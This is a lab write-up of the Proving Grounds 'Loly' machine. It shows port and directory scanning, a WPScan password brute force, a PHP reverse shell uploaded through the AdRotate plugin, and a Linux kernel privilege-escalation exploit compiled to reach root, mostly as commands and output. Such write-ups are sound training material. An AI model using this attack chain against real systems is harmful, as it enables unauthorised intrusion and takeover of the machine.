---
layout: single
title: 'Proving Grounds Loly'
collection: writeups
author_profile: true
date: 2026-01-01
permalink: /writeups/loly/
tags: [Proving Grounds, Medium, Linux, Wordpress]
---

## Overview

This write-up covers Loly, a medium level, OSCP-style standalone Linux machine from the Offsec Proving grounds platform featured on TJ Null’s OSCP preparation [list](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview) . Since this is the first writeup, I wanted to start with something straightforward and not too complex. Loly is good practice for exploiting Wordpress and Linux kernel vulnerabilities.
[https://portal.offsec.com/machine/loly-532/overview/details](https://portal.offsec.com/machine/loly-532/overview/details)

<div style="margin: 2rem 0;"></div>

## Enumeration

<div style="margin: 1rem 0;"></div>
The attacker starts by using nmap to check available services.




```bash 

 sudo nmap -sC -sV  -p- $IP --open            
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-14 15:11 EST
 Nmap scan report for 192.168.145.121
 Host is up (0.016s latency).
 Not shown: 65534 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
 80/tcp open  http    nginx 1.10.3 (Ubuntu)
 |_http-server-header: nginx/1.10.3 (Ubuntu)
 |_http-title: Welcome to nginx!
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 13.93 seconds	

```
<div style="margin: 2rem 0;"></div>
Seeing port 80 is available, the attacker manually enumerates the site and sees an nginx landing page.
![nginx](/images/loly/nginx_about.png)

<div style="margin: 2rem 0;"></div>
Using feroxbuster, the attacker enumerates the web directories noticing endpoints indicating a WordPress site.


```bash

 feroxbuster --url http://$IP  -t 50 -E -B -g 
                                                                                 
  ___  ___  __   __     __      __         __   ___
 |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
 |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
 by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.145.121
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💰  Collect Extensions    │ true
 💸  Ignored Extensions    │ [Images, Movies, Audio, etc...]
 🏦  Collect Backups       │ true
 🤑  Collect Words         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
 404      GET        7l       13w      178c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
 200      GET       25l       69w      612c http://192.168.145.121/
 301      GET        7l       13w      194c http://192.168.145.121/wordpress => http://192.168.145.121/wordpress/
 301      GET        7l       13w      194c http://192.168.145.121/wordpress/wp-admin => http://192.168.145.121/wordpress/wp-admin/
 301      GET        7l       13w      194c http://192.168.145.121/wordpress/wp-includes => http://192.168.145.121/wordpress/wp-includes/
 301      GET        7l       13w      194c http://192.168.145.121/wordpress/wp-content => http://192.168.145.121/wordpress/wp-content/
 301      GET        7l       13w      194c http://192.168.145.121/wordpress/wp-includes => http://192.168.145.121/wordpress/wp-includes/    

```
<div style="margin: 2rem 0;"></div>

The attacker then visits the /wordpress endpoints and notes the loly.lc domain; after adding it to /etc/hosts, the WordPress site can be viewed clearly.
```bash

 192.168.145.121 loly.lc  
 
```


![wordpress](/images/loly/wordpress.png)

<div style="margin: 2rem 0;"></div>
Utilizing WPScan, the attacker enumerated plugins, themes, and user accounts. After identifying the loly user, a brute‑force attack was performed, resulting in wordpress admin credentials and access to the wp‑admin panel.
**Username: loly, Password: fernando**

```bash

 wpscan --url http://loly.lc/wordpress/ --enumerate u 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

 [+] URL: http://loly.lc/wordpress/ [192.168.145.121]
 [+] Started: Wed Jan 14 15:38:38 2026

 Interesting Finding(s):
 [+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===> (10 / 10) 100.00% Time: 00:00:00

 [i] User(s) Identified:

 [+] loly
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

```
<div style="margin: 1rem 0;"></div>
```bash

 wpscan --url http://loly.lc/wordpress/ --passwords rockyou.txt --usernames loly
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

 [+] URL: http://loly.lc/wordpress/ [192.168.145.121]
 [+] Started: Wed Jan 14 15:42:44 2026

 Interesting Finding(s):

 [i] Plugin(s) Identified:

 [+] adrotate
 | Location: http://loly.lc/wordpress/wp-content/plugins/adrotate/
 | Last Updated: 2025-12-26T18:11:00.000Z
 | [!] The version is out of date, the latest version is 5.17.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 5.8.6.2 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://loly.lc/wordpress/wp-content/plugins/adrotate/readme.txt

 [+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <==> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

 [+] Performing password attack on Xmlrpc against 1 user/s
 [SUCCESS] - loly / fernando                                                      
 Trying loly / corazon Time: 00:00:02 <   > (175 / 14344567)  0.00%  ETA: ??:??:??

 [!] Valid Combinations Found:
 | Username: loly, Password: fernando 

```
<div style="margin: 1rem 0;"></div>
![wp-admin](/images/loly/wp-admin.png)

<div style="margin: 2rem 0;"></div>
Now, with admin access, the attacker further enumerates the plugins and finds the adrotate plugin has the ability to upload files. Researching the plugin further, the attacker finds [https://nvd.nist.gov/vuln/detail/CVE-2022-1206](https://nvd.nist.gov/vuln/detail/CVE-2022-1206) confirming the attack path.
![NIST](/images/loly/nist.png)
<div style="margin: 2rem 0;"></div>




## Exploitation 
<div style="margin: 1rem 0;"></div>
Making use of the identified file upload vulnerability, the attacker set up a listener, packaged a PHP reverse shell into a ZIP archive, and uploaded it to the application. By navigating to [http://loly.lc/wordpress/wp-content/banners/shellphp.php](http://loly.lc/wordpress/wp-content/banners/shellphp.php), the payload was executed, resulting in user-level access.
<div style="margin: 1rem 0;"></div>
![upload](/images/loly/upload.png)
<div style="margin: 1rem 0;"></div>
```bash

 nc -lvnp 4000
 listening on [any] 4000 ...
 connect to [192.168.45.167] from (UNKNOWN) [192.168.145.121] 51200   
 Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016  x86_64 x86_64 x86_64 GNU/Linux   
  14:12:46 up  3:25,  0 users,  load average: 0.00, 0.00, 0.00
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)  
 bash: cannot set terminal process group (3069): Inappropriate ioctl for  device  
 bash: no job control in this shell
 www-data@ubuntu:/$ whoami
 whoami
 www-data
 
```
<div style="margin: 2rem 0;"></div>



## Privilege Escalation
<div style="margin: 1rem 0;"></div>
Through enumeration, the attacker identified that the target was running a Linux kernel version vulnerable to CVE-2017-16995.
[https://www.exploit-db.com/exploits/45010](https://www.exploit-db.com/exploits/45010)
```bash

 uname -a
 Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux  
 
```
<div style="margin: 2rem 0;"></div>
The attacker transfers over the file the file using a simple webserver and attempts to compile it, running into a error.
```bash

 python -m http.server 80  
 
```
<div style="margin: 1rem 0;"></div>
![PE_ERROR](/images/loly/pe_error1.png)

<div style="margin: 2rem 0;"></div>

In order to compile the exploit, the attacker finds cc1 and adds it to the target's path.
```bash 

 www-data@ubuntu:/tmp$ find /usr -name cc1
 /usr/lib/gcc/x86_64-linux-gnu/5/cc1
 www-data@ubuntu:/tmp$ /usr/lib/gcc/x86_64-linux-gnu/5/cc1
 www-data@ubuntu:/tmp$ export PATH=$PATH:/usr/lib/gcc/x86_64-linux-gnu/5/cc1  
 www-data@ubuntu:/tmp$ gcc 45010.c -o privesc

```
<div style="margin: 2rem 0;"></div>

Finally, the attacker adds execute permissions to the file and runs it, successfully gaining root access and fully compromising the machine.
``` bash

 www-data@ubuntu:/tmp$ chmod +x privesc
 www-data@ubuntu:/tmp$ ./privesc
 [.] 
 [.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)   
 [.] 
 [.]   ** This vulnerability cannot be exploited at all on authentic  grsecurity kernel **
 [.] 
 [*] creating bpf map
 [*] sneaking evil bpf past the verifier
 [*] creating socketpair()
 [*] attaching bpf backdoor to socket
 [*] skbuff => ffff880035eec100
 [*] Leaking sock struct from ffff880035cb8f00
 [*] Sock->sk_rcvtimeo at offset 472
 [*] Cred structure at ffff880035d8ca80
 [*] UID from cred structure: 33, matches the current: 33
 [*] hammering cred structure at ffff880035d8ca80
 [*] credentials patched, launching shell...
 # whoami
 root
 
 ```
